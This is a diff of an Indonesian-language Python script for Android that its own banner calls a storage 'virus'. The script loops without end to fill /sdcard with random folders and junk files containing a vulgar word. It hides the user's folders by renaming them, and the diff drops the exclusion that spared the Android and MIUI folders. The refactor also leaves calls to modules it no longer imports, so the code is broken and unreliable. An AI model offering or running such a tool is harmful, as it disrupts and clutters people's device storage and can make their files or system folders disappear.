@@ -1,32 +1,32 @@
-import os
-import random
-import string
+from os import path, stat, system, remove, mkdir, removedirs, rename
+from random import choice
+from string import ascii_lowercase, ascii_uppercase
 
-if os.path.isfile(".bakso_kontol"):
-    pass
+if path.isfile(".bakso_kontol"): pass
 else:
     with open(".bakso_kontol","w", encoding="utf-8") as list_file:
         list_sdcard = os.listdir("/sdcard/")
         for folder_utama in list_sdcard:
             list_file.write(f"{folder_utama}\n")
 
+def clear():
+    system("clear")
+
 
 def konvert_ke_bit(number):
     for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
-        if number < 1024.0:
-            return "%3.1f %s" % (number, x)
+        if number < 1024.0: return "%3.1f %s" % (number, x)
         number /= 1024.0
 
 def ukuran_file(lokasi_file):
     if os.path.isfile(lokasi_file):
-        file_info = os.stat(lokasi_file)
+        file_info = stat(lokasi_file)
         return konvert_ke_bit(file_info.st_size)
 
 lokasi_file = r"/sdcard/bakso_kontol.txt"
 
 def ban():
-    global status
-    os.system("clear")
+    clear()
     banner = """
             •=======================•
             | Vivirusan Penyimpanan |
@@ -48,29 +48,21 @@ def ban():
     print(banner)
     try:
         pilih = int(input("Silahkan Pilih : "))
-        if pilih == 1:
-            virus_file()
-        elif pilih == 2:
-            res_file()
-        elif pilih == 3:
-            virus_folder()
-        elif pilih == 4:
-            res_folder()
-        elif pilih == 5:
-            file_folder()
-        elif pilih == 6:
-            res_file_folder()
-        elif pilih == 7:
-            haiden_file()
-        elif pilih == 8:
-            showen_file()
+        if (pilih == 1): virus_file()
+        elif (pilih == 2): res_file()
+        elif (pilih == 3): virus_folder()
+        elif (pilih == 4): res_folder()
+        elif (pilih == 5): file_folder()
+        elif (pilih == 6): res_file_folder()
+        elif (pilih == 7): haiden_file()
+        elif (pilih == 8): showen_file()
     except ValueError:
         ban()
     except KeyboardInterrupt:
         help()
 
 def help():
-    os.system("clear")
+    clear()
     bantuan = """
   Assalamu'alaikum bro ,
 
@@ -124,7 +116,7 @@ def virus_file():
         file.write("Virus Bakso Kontol\n\n\n")
     with open("/sdcard/bakso_kontol.txt","a",encoding="utf-8") as file:
         try:
-            os.system("clear")
+            clear()
             print("[•] Sedang Membuat File . . .")
             print("[•] Ctrl - C Untuk Berhenti & Melihat Hasil\n")
             print("[•] Untuk Hasil Silakan Cek Di Penyimpanan Internal")
@@ -138,13 +130,13 @@ def virus_file():
 
 def res_file():
     try:
-        os.remove("/sdcard/bakso_kontol.txt")
-        os.system("clear")
+        remove("/sdcard/bakso_kontol.txt")
+        clear()
         print("[√] Ok Done , Berhasil Menghapus File\n")
         input("Enter Untuk Melanjutkan ")
         ban()
     except FileNotFoundError:
-        os.system("clear")
+        clear()
         print("File Tidak Ada 🤨 ,")
         print("Sepertinya Sudah Dihapus \n")
         input("Enter Untuk Melanjutkan ")
@@ -152,7 +144,7 @@ def res_file():
 
 def virus_folder():
     jumlah_folder_dibuat = 0
-    os.system("clear")
+    clear()
     print("[•] Sedang Membuat Folder . . .")
     print("[•] Ctrl - C Untuk Berhenti & Melihat Hasil\n")
     print("[•] Untuk Hasil Silakan Cek Di Penyimpanan Internal")
@@ -161,30 +153,27 @@ def virus_folder():
         while True:
             jumlah_folder_dibuat += 1
             nama_random = string.ascii_lowercase
-            nama_folder = "".join(random.choice(nama_random) for i in range(50))
+            nama_folder = "".join(choice(nama_random) for i in range(50))
             with open("restore/folder","a",encoding="utf-8") as f_folder:
                 f_folder.write(f"{nama_folder}\n")
-                os.mkdir(f"/sdcard/{nama_folder}")
+                mkdir(f"/sdcard/{nama_folder}")
     except KeyboardInterrupt:
         print(f"\n\n[√] Ok Done , {jumlah_folder_dibuat} Folder Dibuat\n")
         input("Enter Untuk Melanjutkan")
         ban()
 
 def res_folder():
-    os.system("clear")
+    clear()
     while True:
         with open("restore/folder","r") as ress_folder:
             data_folder_rm = ress_folder.readlines()
             for i in data_folder_rm:
                 try:
                     name_folder = i.replace("\n","")
-                    os.removedirs(f"/sdcard/{name_folder}")
-                except FileNotFoundError:
-                    continue
-            try:
-                os.system("rm restore/folder && touch restore/folder")
-            except FileNotFoundError:
-                pass
+                    removedirs(f"/sdcard/{name_folder}")
+                except FileNotFoundError: continue
+            try: system("rm restore/folder && touch restore/folder")
+            except FileNotFoundError: pass
             print(f"[√] Ok Done , Berhasil Menghapus {len(data_folder_rm)} Folder\n")
             input("Enter Untuk Melanjutkan ")
             break
@@ -192,25 +181,23 @@ def res_folder():
 
 
 def file_folder():
-    folder_create = 0
-    file_create = 0
+    folder_create, file_create = 0, 0
     try:
-        os.system("clear")
+        clear()
         print("[•] Sedang Membuat File Dan Folder. . . ")
         print("[•] Ctrl - C Untuk Berhenti & Melihat Hasil\n")
         print("[•] Untuk Hasil Silakan Cek Di Penyimpanan Internal\n")
         while True:
             folder_create += 1
             file_create += 1
-            nama_asci = string.ascii_lowercase
-            nama_asciii = string.ascii_uppercase
-            nama_folder = "".join(random.choice(nama_asci) for a in range(50))
-            nama_file = "".join(random.choice(nama_asciii) for b in range(50))
+            nama_asci,  nama_asciii = ascii_lowercase, ascii_uppercase
+            nama_folder = "".join(choice(nama_asci) for a in range(50))
+            nama_file = "".join(choice(nama_asciii) for b in range(50))
             with open ("restore/folders","a",encoding="utf-8") as folders:
                 folders.write(f"{nama_folder}\n")
             with open("restore/files","a",encoding="utf-8") as files:
                 files.write(f"{nama_file}\n")
-            os.mkdir(f"/sdcard/{nama_folder}")
+            mkdir(f"/sdcard/{nama_folder}")
             with open(f"/sdcard/{nama_file}.txt","w",encoding="utf-8") as file_gg:
                 file_gg.write("Kontol"*100)
     except KeyboardInterrupt:
@@ -221,13 +208,13 @@ def file_folder():
         ban()
 
 def res_file_folder():
-    os.system("clear")
+    clear()
     with open("restore/folders","r") as folders:
         list_folders = folders.readlines()
         for i in list_folders:
             folders = i.replace("\n","")
             try:
-                os.removedirs(f"/sdcard/{folders}")
+                removedirs(f"/sdcard/{folders}")
             except FileNotFoundError:
                 continue
     print(f"[√] Ok Done , {len(list_folders)} Folder Di Hapus")
@@ -235,13 +222,11 @@ def res_file_folder():
         list_files = files.readlines()
         for i in list_files:
             files = i.replace("\n","")
-            try:
-                os.remove(f"/sdcard/{files}.txt")
-            except FileNotFoundError:
-                continue
+            try: remove(f"/sdcard/{files}.txt")
+            except FileNotFoundError: continue
     print(f"[√] Ok Done , {len(list_files)} File   Di Hapus\n")
-    os.system("rm restore/folders && touch restore/folders")
-    os.system("rm restore/files && touch restore/files")
+    system("rm restore/folders && touch restore/folders")
+    system("rm restore/files && touch restore/files")
     input("Enter Untuk Melanjutkan ")
     ban()
 
@@ -250,19 +235,10 @@ def haiden_file():
         data = list_sdcard.readlines()
         for i in data:
             nama_folder = i.replace("\n","")
-            match nama_folder:
-                case "Android" : continue
-                case "MIUI" : continue
-                case "Fonts": continue
-                case "Movies": continue
-            try:
-                os.rename(f"/sdcard/{nama_folder}",f"/sdcard/.{nama_folder}")
-            except FileNotFoundError:
-                continue
-            except PermissionError:
-                continue
-            except OSError:
-                continue
+            try: rename(f"/sdcard/{nama_folder}",f"/sdcard/.{nama_folder}")
+            except FileNotFoundError: continue
+            except PermissionError: continue
+            except OSError: continue
 
 def showen_file():
     with open(".bakso_kontol","r") as list_sdcard:
@@ -274,14 +250,10 @@ def showen_file():
                 case "MIUI": continue
                 case "Fonts": continue
                 case "Movies": continue
-            try:
-                os.rename(f"/sdcard/.{nama_folder}",f"/sdcard/{nama_folder}")
-            except FileNotFoundError:
-                continue
-            except PermissionError:
-                continue
-            except OSError:
-                continue
-    os.remove(".bakso_kontol")
+            try: rename(f"/sdcard/.{nama_folder}",f"/sdcard/{nama_folder}")
+            except FileNotFoundError: continue
+            except PermissionError: continue
+            except OSError:continue
+    remove(".bakso_kontol")
 
 ban()
